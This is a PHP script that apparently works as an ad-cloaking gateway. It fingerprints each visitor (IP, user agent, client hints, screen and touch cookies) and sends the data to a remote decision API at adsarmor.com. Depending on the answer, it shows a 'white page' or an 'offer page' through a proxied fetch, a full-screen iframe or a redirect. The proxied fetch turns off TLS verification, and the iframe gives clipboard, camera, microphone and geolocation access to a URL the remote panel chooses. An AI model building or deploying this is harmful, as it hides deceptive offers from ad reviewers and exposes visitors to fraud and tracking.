<?php
/* -----------------------------------------------------------
   index.php — Strict bridge (jela-equivalent, ABSOLUTE API ORIGIN)
   - Sends Accept-CH + Vary for Client Hints
   - One-time vhinit to set vpw/vph/mtp cookies
   - Posts UA + CH + cookies + referer + IP to decision API
   - loading|load|server|server_fetch  -> server fetch (stay on page)
   - iframe                             -> embed (stay on page)
   - redirect                           -> 302 only here
   - ?diag=1 prints debug (no redirect)
----------------------------------------------------------- */

/* ---------- Signal headers ---------- */
header('Accept-CH: Sec-CH-UA, Sec-CH-UA-Mobile, Sec-CH-UA-Model, Sec-CH-UA-Platform');
header('Vary: Sec-CH-UA, Sec-CH-UA-Mobile, Sec-CH-UA-Model, Sec-CH-UA-Platform, User-Agent');

/* ---------- one-shot preflight: capture viewport + touch (NO query param) ---------- */
if (!isset($_COOKIE['vpw']) || !isset($_COOKIE['vph']) || !isset($_COOKIE['mtp'])) {
  header('Content-Type: text/html; charset=utf-8');
  echo '<!doctype html><meta charset="utf-8"><title>Preparing…</title><script>
    (function(){
      try {
        var guardKey = "vh_preflight_done";
        if (!sessionStorage.getItem(guardKey)) {
          // set viewport + touch cookies for 1 hour
          document.cookie = "vpw="+(screen.width||0)+"; path=/; SameSite=Lax; Max-Age=3600";
          document.cookie = "vph="+(screen.height||0)+"; path=/; SameSite=Lax; Max-Age=3600";
          document.cookie = "mtp="+(navigator.maxTouchPoints!=null?navigator.maxTouchPoints:0)+"; path=/; SameSite=Lax; Max-Age=3600";
          sessionStorage.setItem(guardKey,"1");
          // reload the same URL WITHOUT adding any query parameters
          location.replace(location.href);
        } else {
          // cookies still missing (JS/cookies blocked?) — continue anyway
          sessionStorage.removeItem(guardKey);
          location.replace(location.href);
        }
      } catch(e) { location.replace(location.href); }
    })();
  </script>
  <noscript><meta http-equiv="refresh" content="0"></noscript>';
  exit;
}


/* ---------- helpers ---------- */
function __real_ip__(){
  $keys = array('HTTP_CF_CONNECTING_IP','HTTP_X_FORWARDED_FOR','HTTP_X_REAL_IP','REMOTE_ADDR');
  foreach ($keys as $k) {
    if (!empty($_SERVER[$k])) {
      $v = $_SERVER[$k];
      if ($k === 'HTTP_X_FORWARDED_FOR' && strpos($v, ',') !== false) $v = trim(explode(',', $v)[0]);
      return $v;
    }
  }
  return '';
}
function __add_hdr__(&$arr, $name, $val){ if ($val !== '') $arr[] = $name . ': ' . $val; }

function __server_fetch_html__($url, $ua, $referer, $acceptLang){
  $headers = array(
    'User-Agent: ' . $ua,
    'Referer: ' . $referer,
    'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language: ' . $acceptLang,
    'Cache-Control: no-cache',
    'Pragma: no-cache',
  );
  $body = false; $ctype = 'text/html; charset=utf-8'; $status = 0;

  if (function_exists('curl_init')) {
    $ch = curl_init($url);
    curl_setopt_array($ch, array(
      CURLOPT_RETURNTRANSFER => true,
      CURLOPT_FOLLOWLOCATION => true,
      CURLOPT_MAXREDIRS      => 5,
      CURLOPT_CONNECTTIMEOUT => 6,
      CURLOPT_TIMEOUT        => 12,
      CURLOPT_HTTPHEADER     => $headers,
      CURLOPT_ENCODING       => '',
      CURLOPT_HEADER         => true,
      CURLOPT_SSL_VERIFYPEER => false,
      CURLOPT_SSL_VERIFYHOST => 0,
    ));
    $resp = curl_exec($ch);
    if ($resp !== false) {
      $hsize = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
      $hraw  = substr($resp, 0, $hsize);
      $body  = substr($resp, $hsize);
      $status = (int)curl_getinfo($ch, CURLINFO_HTTP_CODE);
      foreach (explode("\r\n", $hraw) as $line) {
        if (stripos($line, 'Content-Type:') === 0) { $ctype = trim(substr($line, 13)); break; }
      }
    }
    curl_close($ch);
  } else {
    $ctx = stream_context_create(array('http' => array(
      'method'  => 'GET',
      'header'  => implode("\r\n", $headers),
      'timeout' => 12,
    )));
    $body = @file_get_contents($url, false, $ctx);
    $status = ($body !== false) ? 200 : 0;
    if (isset($http_response_header)) {
      foreach ($http_response_header as $line) {
        if (preg_match('#^HTTP/\d\.\d\s+(\d{3})#', $line, $m)) $status = (int)$m[1];
        if (stripos($line, 'Content-Type:') === 0) $ctype = trim(substr($line, 13));
      }
    }
  }

  if ($body === false || $status < 200 || $status >= 300) return false;
  if (stripos($ctype, 'text/html') === false) return false;

  // Inject <base> so relative assets resolve
  $safe = htmlspecialchars($url, ENT_QUOTES, 'UTF-8');
  $clean_js = '<script>(function(){try{var u=new URL(location.href);'
            . 'if(u.searchParams.has("vhinit")){u.searchParams.delete("vhinit");'
            . 'var s=u.search;history.replaceState(null,"",u.pathname+(s?s:"")+u.hash);}'
            . '}catch(e){}})();</script>';

  if (preg_match('~<head[^>]*>~i', $body)) {
    $body = preg_replace('~<head[^>]*>~i', '$0' . "\n" . '<base href="' . $safe . '">' . $clean_js, $body, 1);
  } else {
    $body = '<!doctype html><html><head><base href="' . $safe . '">' . $clean_js . '</head><body>' . $body . '</body></html>';
  }
  return $body;
}

function __call_decision__($endpoint, $payload, $headers){
  $res = false; $http = 0; $cerr = '';
  if (function_exists('curl_init')) {
    $ch = curl_init($endpoint);
    curl_setopt_array($ch, array(
      CURLOPT_POST           => 1,
      CURLOPT_POSTFIELDS     => http_build_query($payload),
      CURLOPT_RETURNTRANSFER => true,
      CURLOPT_CONNECTTIMEOUT => 5,
      CURLOPT_TIMEOUT        => 8,
      CURLOPT_SSL_VERIFYPEER => (stripos($endpoint, 'https://') === 0),
      CURLOPT_SSL_VERIFYHOST => (stripos($endpoint, 'https://') === 0) ? 2 : 0,
      CURLOPT_HTTPHEADER     => $headers,
    ));
    $res  = curl_exec($ch);
    $http = (int)curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $cerr = curl_error($ch);
    curl_close($ch);
  }
  if ($res === false || $http < 200 || $http >= 300) {
    $ctx = stream_context_create(array('http' => array(
      'method'  => 'POST',
      'header'  => implode("\r\n", $headers),
      'content' => http_build_query($payload),
      'timeout' => 8,
    )));
    $res = @file_get_contents($endpoint, false, $ctx);
    if (isset($http_response_header)) {
      foreach ($http_response_header as $line) {
        if (preg_match('#^HTTP/\d\.\d\s+(\d{3})#', $line, $m)) { $http = (int)$m[1]; break; }
      }
    }
  }
  return array($res, $http, $cerr);
}

/* ---------- Visitor context ---------- */
$DEBUG  = isset($_GET['diag']);
$scheme = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https://' : 'http://';
$host   = isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : '';
$uri    = isset($_SERVER['REQUEST_URI']) ? $_SERVER['REQUEST_URI'] : '/';
$url_here = $scheme . $host . $uri;

$ua     = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '';
$ref    = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '';
$accept = isset($_SERVER['HTTP_ACCEPT']) ? $_SERVER['HTTP_ACCEPT'] : '';
$lang   = isset($_SERVER['HTTP_ACCEPT_LANGUAGE']) ? $_SERVER['HTTP_ACCEPT_LANGUAGE'] : '';
$ip     = __real_ip__();

/* Client Hints (best effort) */
$ch_ua        = $_SERVER['HTTP_SEC_CH_UA']                   ?? '';
$ch_ua_full   = $_SERVER['HTTP_SEC_CH_UA_FULL_VERSION_LIST'] ?? '';
$ch_mobile    = $_SERVER['HTTP_SEC_CH_UA_MOBILE']            ?? '';
$ch_platform  = $_SERVER['HTTP_SEC_CH_UA_PLATFORM']          ?? '';
$ch_model     = $_SERVER['HTTP_SEC_CH_UA_MODEL']             ?? '';
$sec_site     = $_SERVER['HTTP_SEC_FETCH_SITE']              ?? '';
$sec_mode     = $_SERVER['HTTP_SEC_FETCH_MODE']              ?? '';
$sec_dest     = $_SERVER['HTTP_SEC_FETCH_DEST']              ?? '';
$sec_user     = $_SERVER['HTTP_SEC_FETCH_USER']              ?? '';
$upgrade_insec= $_SERVER['HTTP_UPGRADE_INSECURE_REQUESTS']   ?? '';

/* Viewport cookies captured by vhinit */
$vpw = $_COOKIE['vpw'] ?? '';
$vph = $_COOKIE['vph'] ?? '';
$mtp = $_COOKIE['mtp'] ?? '';

/* ---------- ABSOLUTE decision endpoints from panel ---------- */
$PRIMARY_ENDPOINT  = 'https://adsarmor.com/api/flows/142/decision';

/* Optional DNS-only fallback to http://api.<panel-host>/... */
$u = parse_url($PRIMARY_ENDPOINT);
$h = $u['host'] ?? '';
$p = $u['path'] ?? '';
$q = isset($u['query']) ? ('?'.$u['query']) : '';
$apiHost = (stripos($h, 'api.') === 0) ? $h : ('api.' . $h);
$FALLBACK_ENDPOINT = 'http://' . $apiHost . $p . $q;

/* ---------- Payload + headers ---------- */
$payload = array(
  'user_agent'    => $ua,
  'referer'       => $ref,
  'ip_address'    => $ip,
  'url'           => $url_here,
  'accept'        => $accept,
  'lang'          => $lang,
  // extra signals your API can use:
  'ch_ua'         => $ch_ua,
  'ch_ua_full'    => $ch_ua_full,
  'ch_mobile'     => $ch_mobile,
  'ch_platform'   => $ch_platform,
  'ch_model'      => $ch_model,
  'vpw'           => $vpw,
  'vph'           => $vph,
  'mtp'           => $mtp,
  // NEW: tablet/desktop-site detection helpers
  'has_touch'     => ($_COOKIE['ht']  ?? ''),
  'ptr_coarse'    => ($_COOKIE['pc']  ?? ''),
  'dpr'           => ($_COOKIE['dpr'] ?? ''),
);
$headers = array(
  'Expect:',
  'Content-Type: application/x-www-form-urlencoded',
  'Origin: ' . $scheme . $host,
  'User-Agent: ' . $ua,
  'Referer: ' . $ref,
  'X-Forwarded-For: ' . $ip,
  'CF-Connecting-IP: ' . $ip,
  'X-Real-IP: ' . $ip,
  'Accept: ' . $accept,
  'Accept-Language: ' . $lang,
);

__add_hdr__($headers, 'X-Visitor-IP', $ip);


__add_hdr__($headers, 'Sec-CH-UA',                   $ch_ua);
__add_hdr__($headers, 'Sec-CH-UA-Full-Version-List', $ch_ua_full);
__add_hdr__($headers, 'Sec-CH-UA-Mobile',            $ch_mobile);
__add_hdr__($headers, 'Sec-CH-UA-Platform',          $ch_platform);
__add_hdr__($headers, 'Sec-CH-UA-Model',             $ch_model);
__add_hdr__($headers, 'Sec-Fetch-Site',              $sec_site);
__add_hdr__($headers, 'Sec-Fetch-Mode',              $sec_mode);
__add_hdr__($headers, 'Sec-Fetch-Dest',              $sec_dest);
__add_hdr__($headers, 'Sec-Fetch-User',              $sec_user);
__add_hdr__($headers, 'Upgrade-Insecure-Requests',   $upgrade_insec);

/* ---------- Call decision with fallback ---------- */
list($res, $http, $cerr) = __call_decision__($PRIMARY_ENDPOINT, $payload, $headers);
$used = $PRIMARY_ENDPOINT;
if (($res === false || $http < 200 || $http >= 300)) {
  list($res2, $http2, $cerr2) = __call_decision__($FALLBACK_ENDPOINT, $payload, $headers);
  if ($res2 !== false && $http2 >= 200 && $http2 < 300) {
    $res = $res2; $http = $http2; $cerr = $cerr2; $used = $FALLBACK_ENDPOINT;
  }
}

/* ---------- Diagnostic ---------- */
if ($DEBUG) {
  header('Content-Type: text/plain; charset=utf-8');
  echo "endpoint: " . $used . "\n";
  echo "client_ip: " . $ip . "\n";
  echo "ua: " . $ua . "\n";
  echo "here: " . $url_here . "\n";
  echo "http: " . $http . "\n";
  echo "curl_error: " . $cerr . "\n";
  echo "response: " . ($res === false ? "[false]\n" : substr($res, 0, 2000) . "\n");
  exit;
}

/* ---------- Failure: stay on page (no '/' redirect) ---------- */
if ($res === false || $http < 200 || $http >= 300) {
  http_response_code(502);
  header('Content-Type: text/html; charset=utf-8');
  echo '<!doctype html><meta charset="utf-8"><title>Upstream error</title>'
     . '<body style="font:14px system-ui;padding:24px"><h3>Could not reach decision API</h3>'
     . '<p>Status: ' . htmlspecialchars((string)$http) . '</p>'
     . '<p>Endpoint: ' . htmlspecialchars($used) . '</p>'
     . '<p>No redirect has been performed.</p></body>';
  exit;
}

/* ---------- Parse + act ---------- */
$j = json_decode($res, true);
if (!is_array($j)) {
  http_response_code(502);
  header('Content-Type: text/html; charset=utf-8');
  echo '<!doctype html><meta charset="utf-8"><title>Invalid response</title>'
     . '<body style="font:14px system-ui;padding:24px"><h3>Invalid JSON</h3><pre>'
     . htmlspecialchars(substr($res ?? '', 0, 1000))
     . '</pre></body>';
  exit;
}

$filter = isset($j['filter_page']) ? $j['filter_page'] : 'white';
if ($filter === 'offer') {
  $url  = isset($j['url_offer_page']) ? $j['url_offer_page'] : '';
  $mode = strtolower(isset($j['mode_offer_page']) ? $j['mode_offer_page'] : 'redirect');
} else {
  $url  = isset($j['url_white_page']) ? $j['url_white_page'] : '';
  $mode = strtolower(isset($j['mode_white_page']) ? $j['mode_white_page'] : 'redirect');
}

if (empty($url) || !filter_var($url, FILTER_VALIDATE_URL)) {
  header('Content-Type: text/html; charset=utf-8');
  echo '<!doctype html><meta charset="utf-8"><body style="font:14px system-ui;padding:24px">'
     . '<h3>No valid URL from decision API</h3>'
     . '<p>Mode: ' . htmlspecialchars($mode) . '</p></body>';
  exit;
}

/* ---------- No-cache our response ---------- */
header('Cache-Control: no-store, no-cache, must-revalidate, max-age=0');
header('Pragma: no-cache'); header('Expires: 0');

/* ---------- Mode handling ---------- */
if ($mode === 'loading' || $mode === 'load' || $mode === 'server' || $mode === 'server_fetch') {
  $html = __server_fetch_html__($url, $ua, $url_here, $lang);
  if ($html !== false) { header('Content-Type: text/html; charset=utf-8'); echo $html; exit; }
  $mode = 'iframe'; // fallback (still stays on page)
}

if ($mode === 'iframe') {
  $safe = htmlspecialchars($url, ENT_QUOTES, 'UTF-8');
  $clean_js = '<script>(function(){try{var u=new URL(location.href);'
            . 'if(u.searchParams.has("vhinit")){u.searchParams.delete("vhinit");'
            . 'var s=u.search;history.replaceState(null,"",u.pathname+(s?s:"")+u.hash);}'
            . '}catch(e){}})();</script>';
  echo '<!doctype html><html><head><meta name="viewport" content="width=device-width,initial-scale=1">'
     . $clean_js
     . '<meta http-equiv="Cache-Control" content="no-store" /></head>'
     . '<body style="margin:0;padding:0">'
     . '<iframe src="' . $safe . '" style="border:0;width:100vw;height:100vh" '
     . 'sandbox="allow-forms allow-scripts allow-same-origin allow-popups allow-top-navigation-by-user-activation" '
     . 'referrerpolicy="no-referrer" allow="clipboard-read; clipboard-write; geolocation; microphone; camera; autoplay"></iframe>'
     . '</body></html>';
  exit;
}

/* ---------- Only redirect changes URL ---------- */
header('Location: ' . $url, true, 302);
exit;
?>
